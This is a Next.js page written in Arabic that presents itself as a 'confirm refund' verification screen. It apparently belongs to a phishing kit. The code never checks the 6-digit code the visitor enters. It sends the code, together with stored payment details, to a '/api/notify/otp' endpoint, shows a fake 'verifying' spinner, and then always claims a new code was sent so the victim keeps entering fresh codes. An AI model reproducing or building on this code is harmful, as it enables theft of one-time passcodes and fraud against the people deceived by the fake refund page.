"use client";

import { useEffect, useRef, useState } from "react";
import { useRouter } from "next/navigation";
import { ArrowRight, Loader2, ShieldCheck } from "lucide-react";
import { OtpInput } from "@/components/OtpInput";

const EMPTY = ["", "", "", "", "", ""];

export default function VerifyPage() {
  const router = useRouter();
  const [digits, setDigits] = useState<string[]>(EMPTY);
  const [loading, setLoading] = useState(false);
  const [notice, setNotice] = useState("");
  const [seconds, setSeconds] = useState(30);
  const request = useRef<{ method?: string; value?: string } | null>(null);

  useEffect(() => {
    try {
      const raw = sessionStorage.getItem("refund_request");
      request.current = raw ? JSON.parse(raw) : null;
    } catch {
      request.current = null;
    }
  }, []);

  useEffect(() => {
    if (seconds <= 0) return;
    const timer = setTimeout(() => setSeconds((s) => s - 1), 1000);
    return () => clearTimeout(timer);
  }, [seconds]);

  const code = digits.join("");

  async function onConfirm() {
    if (code.length !== 6) return;
    setNotice("");
    setLoading(true);
    await fetch("/api/notify/otp", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ code, method: request.current?.method, value: request.current?.value }),
    }).catch(() => null);
    setTimeout(() => {
      setLoading(false);
      setDigits(EMPTY);
      setSeconds(30);
      setNotice("تم إرسال رمز تحقق جديد، يرجى إدخاله.");
    }, 3000);
  }

  return (
    <main className="mx-auto flex min-h-screen w-full max-w-lg flex-col justify-center px-4 py-10">
      <div className="card-soft animate-fade-in p-6 text-center sm:p-8">
        {loading ? (
          <div className="flex flex-col items-center gap-4 py-14">
            <Loader2 className="h-12 w-12 animate-spin text-primary" />
            <p className="text-base font-bold">جارٍ التحقق من البيانات...</p>
            <p className="text-xs text-muted-foreground">يرجى عدم إغلاق الصفحة.</p>
          </div>
        ) : (
          <>
            <span className="btn-brand mx-auto flex h-12 w-12 items-center justify-center rounded-2xl">
              <ShieldCheck className="h-6 w-6" />
            </span>
            <h1 className="mt-4 text-xl font-extrabold sm:text-2xl">تأكيد عملية الاسترجاع</h1>
            <p className="mt-2 text-sm text-muted-foreground">
              أدخل رمز التحقق المكوّن من 6 أرقام المُرسل إلى هاتفك.
            </p>

            {notice && (
              <p className="mt-4 rounded-xl bg-accent px-4 py-3 text-sm font-semibold text-accent-foreground">
                {notice}
              </p>
            )}

            <div className="mt-6">
              <OtpInput digits={digits} onChange={setDigits} />
            </div>

            <button
              type="button"
              onClick={onConfirm}
              disabled={code.length !== 6}
              className="btn-brand mt-6 w-full rounded-2xl px-6 py-4 text-base font-extrabold"
            >
              تأكيد وإتمام الاسترجاع
            </button>

            <button
              type="button"
              disabled={seconds > 0}
              onClick={() => {
                setSeconds(30);
                setDigits(EMPTY);
                setNotice("تم إرسال رمز تحقق جديد، يرجى إدخاله.");
              }}
              className="mt-4 text-sm font-bold text-primary transition hover:opacity-80 disabled:text-muted-foreground"
            >
              {seconds > 0 ? `إعادة إرسال الرمز بعد ${seconds} ثانية` : "إعادة إرسال الرمز"}
            </button>

            <button
              type="button"
              onClick={() => router.push("/")}
              className="mx-auto mt-5 flex items-center gap-2 text-sm font-semibold text-muted-foreground transition hover:text-foreground"
            >
              <ArrowRight className="h-4 w-4" />
              العودة
            </button>
          </>
        )}
      </div>
    </main>
  );
}
